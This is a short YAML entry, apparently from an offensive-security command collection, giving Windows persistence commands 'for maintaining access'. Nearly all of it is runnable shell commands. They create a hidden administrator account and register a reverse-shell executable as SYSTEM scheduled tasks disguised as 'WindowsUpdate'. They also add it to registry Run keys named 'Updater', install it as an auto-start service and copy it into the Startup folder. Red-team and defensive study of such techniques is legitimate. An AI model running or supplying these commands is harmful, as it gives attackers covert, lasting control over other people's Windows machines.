---
description: |
  Windows persistence techniques — create admin users, scheduled tasks, registry run keys, and services for maintaining access.
commands:
  - have: Shell
    cmd: |
      # --- Add admin user ---
      net user hacker P@ssw0rd /add
      net localgroup Administrators hacker /add

      # Hide user from login screen (optional)
      reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0 /f

      # --- Scheduled task persistence ---
      # Run reverse shell every time user logs in
      schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\reverse.exe" /sc onlogon /ru SYSTEM

      # Run every 5 minutes
      schtasks /create /tn "Maintenance" /tr "C:\Temp\reverse.exe" /sc minute /mo 5

      # Run at startup
      schtasks /create /tn "StartupTask" /tr "C:\Temp\reverse.exe" /sc onstart /ru SYSTEM

      # --- Registry Run Key persistence ---
      # Current user (no admin needed)
      reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\reverse.exe" /f

      # All users (requires admin)
      reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\reverse.exe" /f

      # --- Service creation persistence ---
      sc create PersistSvc binpath= "C:\Temp\reverse.exe" start= auto
      sc start PersistSvc

      # --- Startup folder ---
      copy C:\Temp\reverse.exe "C:\Users\sec_user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
phase:
  - Persistence
target_os:
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
---
